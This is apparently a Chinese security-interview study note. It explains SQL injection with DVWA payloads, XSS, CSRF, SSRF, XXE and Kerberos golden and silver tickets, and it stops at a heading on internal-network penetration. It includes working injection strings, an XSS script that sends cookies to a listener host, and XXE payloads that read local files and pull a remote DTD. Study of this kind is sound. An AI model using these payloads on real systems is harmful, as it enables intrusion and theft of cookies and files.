<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#数据库名：dvwa/第一个表名：guestbook</span><br><span class="line"></span><br><span class="line">1&#x27; and length(database()) = 4#					#判断数据库名长度</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr(database(),1,1)) = 100#		#判断数据库名的第一个字符ascii值</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;) = 2#	#判断数据库中表的数量</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)) = 103#								  #判断第一个表名的第一个字符ascii值</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27;) = 3#					#判断列的数量</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99#		#判断列名的第一个字符ascii值</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(comment_id) from dvwa.guestbook) = 1#		#判断字段的数量</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr((select concat(comment_id,0x23,comment) from dvwa.guestbook),1,1)) = 49#</span><br></pre></td></tr></table></figure>



<ul>
<li>基于时间的盲注：不能从返回结果判断，只能通过时间函数（sleep等）延时来判断</li>
</ul>
<p>时间盲注大致和布尔盲注差不多，只不过是通过是否延时来判断执行成功与否</p>
<p>重要函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(boolean, exp1, exp2)		#如果为true，返回exp1，反之返回exp2</span><br><span class="line">sleep(sec)					#延时执行</span><br></pre></td></tr></table></figure>

<p>大致流程和布尔型差不多，把布尔换成靠延时来判断即可</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220603154747972.png" alt="image-20220603154747972" style="zoom: 67%;" />

<ul>
<li>联合查询注入：通常适用于有回显和显示位置有差异性的注入</li>
</ul>
<p>重要函数：union</p>
<p>一般步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2#				#判断字段数，多了会报错</span><br><span class="line"></span><br><span class="line">1&#x27; union select 1,2#		#判断相应字段的显示位置</span><br><span class="line"></span><br><span class="line">1&#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;#	#通过information_schema查询dvwa中的表名</span><br></pre></td></tr></table></figure>



<ul>
<li>堆叠注入：可以通过分号间隔同时执行多条语句的注入</li>
<li>宽字节注入</li>
</ul>
<p>正常使用addslashes函数或者开启php的GPC时，为了防止特殊字符污染，会自动将预定义字符转义成加反斜杠的字符串；而使用了指定编码的语句<code>set name &#39;gbk&#39;</code>时，相当于自动执行了三条语句（客户端，连接层，结果集都设置为GBK）；而宽字节注入就是发生在php发送请求到mysql时使用了<code>set name &#39;gbk&#39;</code>进行了一次gbk编码，由于一些特殊的字符集转换导致了宽字节注入。</p>
<p>原理：</p>
<p>在php中指定mysql为GBK编码，而php使用UTF-8编码时可造成宽字节注入</p>
<p>比如下面情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：1&#x27; union select 1,2#</span><br><span class="line">转义：1\&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>

<p>单引号被转义成了 \‘ ，故语法不正确，因此我们需要想办法去掉这个右斜线；mysql在使用GBK编码的时候，会认为两个字符是一个汉字，并且前一个ascii码大于128时才到汉字的范围；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2# -&gt; 1\&#x27; union select 1,2# -&gt; 1%5C%27%20union%20select%201%2C2%23 #此时%5C%27还是\&#x27;</span><br><span class="line"></span><br><span class="line">?id=1%df&#x27; union select 1,2# -&gt; 1[汉字]\&#x27; union select 1,2# -&gt; 1%DF%5C%27%20union%20select%201%2C2%23	#此时%DF%5C组成了一个汉字（gbk编码认为两个字符是一个汉字），而%27也就是单引号成功逃逸</span><br></pre></td></tr></table></figure>



<ul>
<li>二次注入：</li>
</ul>
<p>利用已经储存的账户数据读取后再次进入查询语句中导致注入（说人话：已经写进数据库的内容，可以把他拿出来再次放进sql查询语句的情况）</p>
<p>一般步骤：</p>
<ol>
<li>确定攻击目标账户名（admin）</li>
<li>注册恶意账户（admin’– -）</li>
<li>修改恶意账户密码</li>
<li>使用修改的密码登录目标账户</li>
</ol>
<p>原理：</p>
<p>假设注册用户的语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users (username, password) values(&quot;$username&quot;, &quot;$password&quot;);</span><br></pre></td></tr></table></figure>

<p>并且没有进行严格过滤，我们可以通过注册恶意用户名来注入，猜测修改密码的sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&#x27;$password&#x27; where username=&#x27;$username&#x27; and password=&#x27;$src_password&#x27;;</span><br></pre></td></tr></table></figure>

<p>此时我们可以构造恶意payload为：<code>admin&#39;-- -</code> ，拼合后的语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&#x27;$password&#x27; where username=&#x27;admin&#x27;-- -&#x27; and password=&#x27;$src_password&#x27;;</span><br></pre></td></tr></table></figure>

<p>此时admin’– - 之后的内容包括确认原密码的语句被注释，等同于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&#x27;$password&#x27; where username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>可在不知情的情况下直接修改admin的密码。</p>
<h2 id="sql注入报错函数"><a href="#sql注入报错函数" class="headerlink" title="sql注入报错函数"></a>sql注入报错函数</h2><ul>
<li>extractvalue函数</li>
</ul>
<p>payload：<code>1&#39; and (extractvalue(1,concat(0x5c,(select user()))))#</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220603212657619.png" alt="image-20220603212657619"></p>
<ul>
<li>updatexml函数</li>
</ul>
<p>payload：<code>1&#39; and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))#</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220603212942036.png" alt="image-20220603212942036"></p>
<ul>
<li>floor函数</li>
</ul>
<p>利⽤ floor(),count(),group by 的冲突报错</p>
<p>payload：<code>1&#39; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220603214105995.png" alt="image-20220603214105995"></p>
<ul>
<li>exp函数</li>
</ul>
<p>payload：<code>1&#39; and exp(~(select * from (select user())a))#</code></p>
<h2 id="sql注入的几个比较重要的点"><a href="#sql注入的几个比较重要的点" class="headerlink" title="sql注入的几个比较重要的点"></a>sql注入的几个比较重要的点</h2><ul>
<li>information_schema数据库里面有很多比较重要的信息，高权限数据库用户可以通过这个数据库来获得很多信</li>
<li>information_schema数据库的schemata表，可以看到所有的数据库名（schema_name字段）</li>
<li>直接查询schema_name字段会返回很多个字段，可能把字段位置占完了，导致显示不全</li>
</ul>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20221019134510438.png" alt="image-20221019134510438" style="zoom: 80%;" />

<p>我们可以通过group_concat()函数来进行分组显示，视为一个字段，可以通过这种方法爆出所有的信息</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20221019134622050.png" alt="image-20221019134622050" style="zoom:67%;" />

<p><strong>注：</strong>group_concat结合union查询时（<code>select 1,2,group_concat</code>）需要放在最后，否则会报错，如果不放在最后则要用<code>select 1,(select group_concat),3;</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20221019143426972.png" alt="image-20221019143426972" style="zoom:80%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20221019143631446.png" alt="image-20221019143631446" style="zoom:80%;" />



<ul>
<li>information_schema数据库的tables表，可以看到所有数据库的表名（table_name）及对应的数据库名（table_schema）</li>
<li>可以使用<code>select group_concat(table_name)from(information_schema.tables)where table_schema = &#39;数据库名&#39;;</code></li>
<li>information_schema数据库的columns表，可以看到所有字段名（column_name）及对应的数据库名（table_schema）和表名（table_name）</li>
<li>可以使用<code>select group_concat(column_name)from(information_schema.columns)where table_name = &#39;表名&#39;;</code></li>
<li></li>
</ul>
<h2 id="xss的方式"><a href="#xss的方式" class="headerlink" title="xss的方式"></a>xss的方式</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>从服务端返回脚本，在客户端触发执行发起攻击，一般通过需要url触发（需要受害者点开链接就能生效，不然只能搞自己。。）</p>
<p><strong>防御方法：</strong>前端在显示的时候过滤或转义危险字符以及标签</p>
<h3 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h3><p>像评论区或者文章等，可以将恶意脚本存储到服务器，每个浏览到该页面的客户端就会触发执行</p>
<p><strong>防御方法：</strong>对发布内容进行过滤再储存到数据库，读取数据库前端显示的时候再进行一次过滤</p>
<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>取决于输出位置，既可以是储存型也可以是反射型；dom是一种树状模型</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3h1XzEyMzQ1Njc=,size_16,color_FFFFFF,t_70pic_center.png" alt="在这里插入图片描述"  />

<p>页面到达浏览器时，浏览器会自动创建一个Document object对象，每个页面元素都对应一个文档对象，客户端可以通过js脚本对这个对象进行动态修改，基于这个特性可以利用js脚本实现xss攻击。</p>
<p>例：</p>
<p>返回cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img=document.createElement(&#x27;img&#x27;);img.src=&#x27;http://10.10.10.151:1234/a?&#x27;+escape(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>nc监听1234端口</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220604141005170.png" alt="image-20220604141005170" style="zoom:80%;" />



<h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>admin用户登录了A网站后台，浏览器保存了admin的cookie，此时攻击者搭建恶意网站B，其中携带一段向A网站请求的恶意代码，引诱admin用户来到恶意网站B（相同浏览器），此时admin用户携带有A网站后台的cookie，然而admin用户不知情，B网站存在恶意请求（如修改密码，发送邮件等），直接使用admin用户携带的cookie，以admin用户的身份向A网站发送恶意请求。</p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>基本有三种方法</p>
<h4 id="HTTP-Referer字段"><a href="#HTTP-Referer字段" class="headerlink" title="HTTP Referer字段"></a>HTTP Referer字段</h4><p>优点：简单易行</p>
<p>缺点：referer字段仅由浏览器提供，不能排除浏览器有其他漏洞的情况，很难保证其真实性，并且某些隐私浏览器不提供referer，可能导致正常用户无法使用功能</p>
<h4 id="token验证或验证码"><a href="#token验证或验证码" class="headerlink" title="token验证或验证码"></a>token验证或验证码</h4><p>csrf能实现的重点无非就是可以在用户不知情的情况下伪造用户请求，我们只需要在其中加入一段黑客无法伪造的字段即可，即token或者验证码，不过难点在于如何对接token和验证码的验证，并且如果在每个请求都添加这种验证方式是很麻烦的</p>
<h4 id="http中自定义属性"><a href="#http中自定义属性" class="headerlink" title="http中自定义属性"></a>http中自定义属性</h4><p>通过xmlhttprequest将token放入http头中进行验证，不过xmlhttprequest一般用于异步请求，且重构网站复杂度高</p>
<h4 id="SameSite字段"><a href="#SameSite字段" class="headerlink" title="SameSite字段"></a>SameSite字段</h4><p>在set-cookies参数中添加SameSite字段，如果是跨站请求直接不执行</p>
<h2 id="ssrf攻击"><a href="#ssrf攻击" class="headerlink" title="ssrf攻击"></a>ssrf攻击</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/v2-bca50003926a87fdd4be2c30d1828d70_1440w.jpg" alt="SSRF漏洞攻击原理及防御方案" style="zoom:80%;" />

<p>服务端请求伪造，攻击者在未取得服务器权限的情况下，利用服务器的漏洞，以服务器的身份向浏览器可达而攻击者不可达的服务器发送请求，再将不可达服务器返回的响应内容返回给攻击者，SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
<p>攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。</p>
<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>过滤返回的信息，应用请求文件后（一般只会请求图片），先对返回内容进行校验，如果满足类型，再返回给用户，不满足则拒绝请求</li>
<li>ssrf一般是用作探测内网服务，我们可以限制ip段，如果是内网就拒绝请求</li>
<li>统一报错信息，比如探测端口的情况，黑客可通过报错判断是否开放，将报错信息全部统一即可</li>
<li>限制请求端口，比如限制80或者443等</li>
<li>限制不常用协议，http和https常用，可以防止file，gopher等协议引发问题</li>
<li>有些网站的域名可能没有解析到内网地址，但是可通过3XX的方式请求内网地址，在不必要的情况下可以禁止所有重定向请求</li>
</ol>
<h2 id="XXE攻击"><a href="#XXE攻击" class="headerlink" title="XXE攻击"></a>XXE攻击</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>普通xml注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/d01373f082025aaf60d0e3b3e495ce6d024f1a6d.png" alt="img"></p>
<p>XML是一种非常流行的标记语言，它经常被用于配置文件，文档格式等。在解析外部实体的过程中，xml解析器可以根据url中指定的协议来查询。外部实体在文档中创建动态引用时非常有用，我们对外部资源进行的任何修改都可以在文档中自动更新。这种特性就导致了XXE攻击可以做到许多的效果</p>
<p>xml有一套格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">        &lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">        &lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">        &lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">        &lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">        &lt;!ELEMENT msg (#PCDATA)&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>像这种定义方式，xml就必须按下面的方式书写</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到每个标签都对应DTD中的一个元素，此外，我们还可以在DTD中定义实体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe &quot;test&quot; &gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>这里 定义元素为 ANY 说明接受任何元素，还定义了xml的实体xxe，体其实可以看成一个变量，可以在 XML 中通过 &amp; 符号进行引用，则xml就应该这样写</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用<code>&amp;xxe;</code>对上面定义的xxe实体进行了引用，即输出test，这就是内部实体。XXE又叫xml外部实体注入，所以下面来看看外部实体</p>
<p>定义一个DTD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>xml代码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样我们在外部实体做的任何修改都可以在user处更新，还有一种方式是引用公共DTD，可以起到和SYSTEM相同的作用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>

<p><strong>通用实体</strong></p>
<p>用<code>&amp;实体名;</code>引用的实体，在DTD中定义，在XML文档中引用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>参数实体</strong></p>
<ul>
<li>使用 <code>% 实体名</code>(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code>引用</li>
<li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li>
<li>和通用实体一样，参数实体也可以外部引用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%an-element;</span><br><span class="line">%remote-dtd;</span><br></pre></td></tr></table></figure>

<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [</span><br><span class="line">    &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>如果读取的文件有特殊符号污染，可能会产生报错，这时候我们可以用到<strong>CDATA</strong></p>
<blockquote>
<p>CDATA节中的所有字符都会被当做元素字符数据的常量部分，格式为<![CDATA[XXXXXXXXXXXXXXXXX]]></p>
</blockquote>
<p>但是xml中并没有能够拼接字符串的语法，这时可以使用多个实体连续引用的方法</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">        %dtd;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br><span class="line"></span><br><span class="line">\\evil.dtd</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="防御方法-2"><a href="#防御方法-2" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>简单粗暴，禁用外部实体</li>
<li>过滤和验证用户提交的xml数据</li>
</ol>
<h2 id="用过的安全设备"><a href="#用过的安全设备" class="headerlink" title="用过的安全设备"></a>用过的安全设备</h2><p>深信服日志审计，深信服数据库审计，深信服防火墙，深信服态势感知</p>
<h2 id="黄金-白银票据的区别"><a href="#黄金-白银票据的区别" class="headerlink" title="黄金&#x2F;白银票据的区别"></a>黄金&#x2F;白银票据的区别</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/v2-b4279994a9625f378f9299fbd1ec1793_r.jpg" alt="preview"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/v2-c82d9a8b0b457bd0c886776f6ce06bee_r.jpg" alt="preview"></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWTVuZUtP,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"  />

<h3 id="从获取的权限"><a href="#从获取的权限" class="headerlink" title="从获取的权限"></a>从获取的权限</h3><ul>
<li>黄金票据：通过伪造TGT票据，可以获取任意Kerberos的访问权限</li>
<li>白银票据：通过伪造ST票据，只能访问指定的服务，如CIFS等</li>
</ul>
<h3 id="从认证流程"><a href="#从认证流程" class="headerlink" title="从认证流程"></a>从认证流程</h3><ul>
<li>黄金票据：与KDC交互，不与AS交互</li>
<li>白银票据：不与KDC交互，直接访问Server服务</li>
</ul>
<h3 id="从加密方式"><a href="#从加密方式" class="headerlink" title="从加密方式"></a>从加密方式</h3><ul>
<li>黄金票据：通过 krbtgt 的 NTLM Hash 加密</li>
<li>白银票据：通过服务账号的 NTLM Hash 加密</li>
</ul>
<h2 id="了解的内网渗透"><a href="#了解的内网渗透" class="headerlink" title="了解的内网渗透"></a>了解的内网渗透</h2><ul>
